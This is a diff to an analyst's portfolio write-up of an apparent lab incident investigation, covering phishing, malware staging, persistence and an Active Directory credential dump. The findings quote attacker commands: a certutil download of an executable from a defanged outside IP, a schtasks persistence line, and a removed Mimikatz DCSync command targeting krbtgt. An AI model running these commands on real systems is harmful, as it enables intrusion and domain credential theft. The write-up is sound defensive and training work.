@@ -44,28 +44,29 @@ This portfolio demonstrates real SOC workflows including alert triage, threat hu
 **Scenario:** One of the employees clicked on a malicious link and got the endpoint compromised. After executing malicious files and getting a foothold, the attacker compromised the AD by dumping sensitive information.
 **What I did:**  
 - Identifing the payload of the malicious link in Email. 
-- Analyzing Sysmon to figure out the activity of the payload.
-- Discovering the commandline run by payloads
-- Tracing the staging path and pivoting to many malicious scripts investigation.
+- Analyzing Sysmon to reconstruct macro execution and child process activity
+- Discovered certutil-based C2 executable download and data staging path C:\Windows\Temp\
+- Traced PowerView.ps1 / Invoke-Mimikatz.ps1 download and execution via PowerShell bypass
+- Identified scheduled task persistence and pivoted to Domain Controller via DCSync analysis
+- 
 **Findings:**  
-- Invoice.docm was downloaded from phishing Url
+- Phishing payload: Invoice.docm  via 139.59.21.147:8080
 - The embedded commandline "cmd.exe /c certutil -urlcache -split -f "http[:]//24[.]199[.]117[.]142[:]1337/svchost.exe" "C:\Windows\Temp\svchost.exe" " was interpretered.
 - Staging path "C:\Windows\Temp"
 - Scripts downloaded by certutil.exe, including PowerView.ps1 and Invoke-Mimikatz.ps1
-- Scheduled task "Microsoft Teams Updater" run by "schtasks.exe  /create /tn "Microsoft Teams Updater" /sc onlogon /tr C:\Windows\Temp\svchost.exe"
-- Credential dump by dcsync identified. "powershell.exe  . .\Invoke-Mimikatz.ps1 ; Invoke-Mimikatz -Command '"lsadump::dcsync /domain:CYBERRANGE.local /user:krbtgt"'" 
+- Scheduled task : "Microsoft Teams Updater" created by "schtasks.exe  /create /tn "Microsoft Teams Updater" /sc onlogon /tr C:\Windows\Temp\svchost.exe"
+- Credential dump ：Invoke-Mimikatz, DCSync → krbtgt hash exfiltrated
 **Tools:** Splunk，Sysmon logs, security logs, system logs  
 **Lessons Learned:**  
 - Gap:
-- Short user training as a way to bring awareness to common phishing and spearphishing techniques and how to raise suspicion for potentially malicious events.
-- Fail to enforce least privilege principles
+- Insufficient phishing awareness training
+- Overly permissive PowerShell execution policy
+- Least privilege not enforced — user could create scheduled tasks
 - Remediation Recommendations：
-- Suspend the account of ricksanchez and reset credential.
-- Containing the infected machine from any connection and duplicating for analysing and eliminating the malicious files at "C:/Windows/Temp/" on Desktop1.
-- Deleting the schdduled task named "Microsoft Teams Updater" on Desktop1.
-- only authorized administrators can create scheduled tasks on remote systems.
-- PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files
-- Set PowerShell execution policy to execute only signed scripts.
+- Suspend ricksanchez + isolate Desktop1 + remove staging files
+- Delete "Microsoft Teams Updater" scheduled task
+- Enable PowerShell Constrained Language Mode
+- Reset krbtgt password (×2) to invalidate harvested hash
 
 ---
 ---
